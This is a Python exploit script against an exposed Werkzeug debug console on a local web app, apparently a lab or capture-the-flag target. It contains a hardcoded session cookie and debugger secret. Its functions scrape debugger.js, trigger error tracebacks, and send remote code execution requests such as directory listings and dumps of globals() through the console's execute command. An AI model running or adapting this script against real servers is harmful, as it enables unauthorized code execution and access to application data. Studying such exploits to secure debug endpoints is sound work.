import requests
import re
import urllib.parse

BASE_URL = "http://127.0.0.1:5003"
SESSION_COOKIE = ".eJwlTstqwzAQ_BWx51Cst-Sv6L2EsJZmY4PbFMs5hfx7F3oa5sm86CY7jxWD5q8XmVOBvjEG30EX-tzBA2Z_3M32Y86H4dbUNOe6DfOrmQ-6vq8XHTkwVprP4wllW6eZandSI3oCCy8MnqKPUoMU26dgpQPcXJhqVsMFgeXInUOISBXF55jES2jagbSaknNoPi8uoTW_5OoXUb0Um3KIMulyh5cktfuYuej923Pg-H9j6f0Hj05H0g.aVsUEw.pzEXTKPJRkglOFBxL9YRXm0BK1c"
SECRET = "YKhX0CLt5PHAxuDtcFOy"

headers = {
    "User-Agent": "Mozilla/5.0 (Security Research)",
    "Cookie": f"session={SESSION_COOKIE}"
}

def get_debugger_js():
    """Get and analyze debugger.js"""
    print("[*] Fetching debugger.js...")
    
    url = f"{BASE_URL}/console?__debugger__=yes&cmd=resource&f=debugger.js"
    resp = requests.get(url, headers=headers)
    
    if resp.status_code != 200:
        print(f"[-] Failed to fetch debugger.js: {resp.status_code}")
        return None
    
    print(f"[+] debugger.js fetched (length: {len(resp.text)})")
    
    # Look for the execute function
    if 'execute' not in resp.text:
        print("[-] No execute function found")
        return None
    
    # Find execute function
    execute_match = re.search(r'function\s+execute\s*\([^)]*\)\s*{([^}]+(?:{[^}]+}[^}]*)*)}', resp.text)
    if execute_match:
        execute_func = execute_match.group(0)
        print(f"\n[+] Found execute function:")
        print(execute_func[:1000])
        
        # Look for AJAX call within execute
        ajax_match = re.search(r'\\$\.ajax\s*\({([^}]+(?:{[^}]+}[^}]*)*)\)', execute_func, re.DOTALL)
        if ajax_match:
            ajax_code = ajax_match.group(1)
            print(f"\n[+] Found AJAX call:")
            print(ajax_code[:500])
            
            # Extract URL
            url_match = re.search(r'url:\s*[\'"]([^\'"]+)[\'"]', ajax_code)
            if url_match:
                ajax_url = url_match.group(1)
                print(f"\n[+] AJAX URL: {ajax_url}")
                
                # Replace template variables
                if '__script_root__' in ajax_url:
                    ajax_url = ajax_url.replace('__script_root__', '/console')
                
                return ajax_url
    
    # Alternative: look for any AJAX calls
    ajax_matches = re.finditer(r'\\$\.ajax\s*\({([^}]+(?:{[^}]+}[^}]*)*)\)', resp.text, re.DOTALL)
    for i, match in enumerate(ajax_matches):
        ajax_code = match.group(1)
        print(f"\n[+] AJAX call {i}:")
        print(ajax_code[:300])
        
        # Check if it's the execute call
        if 'execute' in ajax_code or 'cmd' in ajax_code:
            url_match = re.search(r'url:\s*[\'"]([^\'"]+)[\'"]', ajax_code)
            if url_match:
                ajax_url = url_match.group(1)
                print(f"[+] Execute AJAX URL: {ajax_url}")
                return ajax_url
    
    return None

def test_console_api():
    """Test the console API based on debugger.js analysis"""
    print("\n[*] Testing console API endpoints...")
    
    # Based on Werkzeug debugger source, the console execution uses this pattern:
    # The console iframe posts to the debugger endpoint with the error traceback
    
    # First, let's trigger an error to get a traceback and console frame
    print("[*] Triggering an error to get traceback...")
    
    # Try accessing a route that causes an error
    try:
        resp = requests.post(
            f"{BASE_URL}/login", 
            headers=headers,
            data={"invalid": "data"},
            allow_redirects=False
        )
        print(f"Login POST status: {resp.status_code}")
        
        # Check if there's a traceback in the response
        if resp.status_code == 500:
            if '__debugger__' in resp.text:
                print("[+] Triggered debugger with traceback")
                
                # Extract the traceback URL
                tb_match = re.search(r'__debugger__[^\'"\s]+', resp.text)
                if tb_match:
                    traceback_url = tb_match.group(0)
                    print(f"[+] Traceback URL: {traceback_url}")
                    
                    # Try to access the console iframe
                    console_match = re.search(r'/console[^\'"\s]*', resp.text)
                    if console_match:
                        console_url = console_match.group(0)
                        print(f"[+] Console URL: {console_url}")
                        return console_url
    except Exception as e:
        print(f"Error triggering error: {e}")
    
    return None

def try_simple_eval():
    """Try simple evaluation without complex API"""
    print("\n[*] Trying simple evaluation methods...")
    
    # The debugger might accept direct code execution like this
    test_urls = [
        f"{BASE_URL}/console?s={SECRET}&cmd=execute&frm=0&code={urllib.parse.quote('print(__import__(\"os\").listdir(\".\"))')}",
        f"{BASE_URL}/console?__debugger__=yes&s={SECRET}&cmd=execute&code={urllib.parse.quote('print(42)')}",
        f"{BASE_URL}/console?__debugger__=yes&cmd=execute&s={SECRET}&code={urllib.parse.quote('print(locals())')}",
        f"{BASE_URL}/?__debugger__=yes&cmd=execute&s={SECRET}&frm=0&code={urllib.parse.quote('print(globals())')}"
    ]
    
    for url in test_urls:
        try:
            print(f"[*] Testing: {url[:120]}...")
            resp = requests.get(url, headers=headers, timeout=10)
            print(f"  Status: {resp.status_code}")
            if resp.status_code == 200:
                print(f"  Response preview: {resp.text[:300]}")
                if 'print(42)' in url and '42' in resp.text:
                    print("  [+] Code execution working!")
                    return url
        except Exception as e:
            print(f"  Error: {e}")
    
    return None

def extract_secret_from_debugger():
    """Extract the secret from debugger.js console"""
    print("\n[*] Getting secret from debugger resources...")
    
    try:
        # Get the main console page again
        resp = requests.get(f"{BASE_URL}/console", headers=headers)
        if resp.status_code == 200:
            # Look for SECRET variable
            secret_match = re.search(r'SECRET\s*=\s*[\'"]([^\'"]+)[\'"]', resp.text)
            if secret_match:
                secret = secret_match.group(1)
                print(f"[+] Extracted SECRET: {secret}")
                return secret
    except Exception as e:
        print(f"Error: {e}")
    
    return None

def test_console_with_traceback():
    """The console needs a traceback context to execute"""
    print("\n[*] Testing console with traceback frame...")
    
    # Trigger an error and get the traceback
    try:
        # Access the transactions page without auth to trigger redirect and error
        resp = requests.get(f"{BASE_URL}/transactions", headers=headers, allow_redirects=False)
        print(f"GET /transactions: {resp.status_code}")
        
        if resp.status_code == 302:
            # Follow the redirect to login page
            login_url = resp.headers.get('Location', '')
            if login_url.startswith('/'):
                login_url = BASE_URL + login_url
            
            login_resp = requests.get(login_url, headers=headers)
            print(f"GET {login_url}: {login_resp.status_code}")
            
            # Now try to access the console with this context
            execute_url = f"{BASE_URL}/console?__debugger__=yes&cmd=execute&s={SECRET}&frm=0&code={urllib.parse.quote('print(\"test\")')}"
            execute_resp = requests.get(execute_url, headers=headers)
            print(f"Execute attempt: {execute_resp.status_code}")
            print(f"Response: {execute_resp.text[:300]}")
            
            return execute_resp
            
    except Exception as e:
        print(f"Error: {e}")
    
    return None

def main():
    print("Werkzeug Debugger Console Exploitation Analysis")
    print("=" * 60)
    
    # Get debugger.js
    print("Step 1: Analyzing debugger.js...")
    ajax_url = get_debugger_js()
    
    # Try to trigger traceback
    print("\nStep 2: Getting traceback context...")
    traceback_console = test_console_api()
    
    # Try simple eval methods
    print("\nStep 3: Trying simple evaluation...")
    working_url = try_simple_eval()
    
    # Test with traceback
    print("\nStep 4: Testing console with traceback...")
    execute_resp = test_console_with_traceback()
    
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    
    if ajax_url:
        print(f"[+] Potential AJAX URL pattern: {ajax_url}")
    
    if working_url:
        print(f"[+] Working execution URL: {working_url}")
    
    if execute_resp and execute_resp.status_code == 200:
        print("[+] Console execution working with traceback context")
        if 'test' in execute_resp.text:
            print("[+] Code execution confirmed!")
    
    print(f"\n[?] Debugger secret: {SECRET}")
    print("[?] Try accessing console manually and check browser developer tools")

if __name__ == "__main__":
    main()
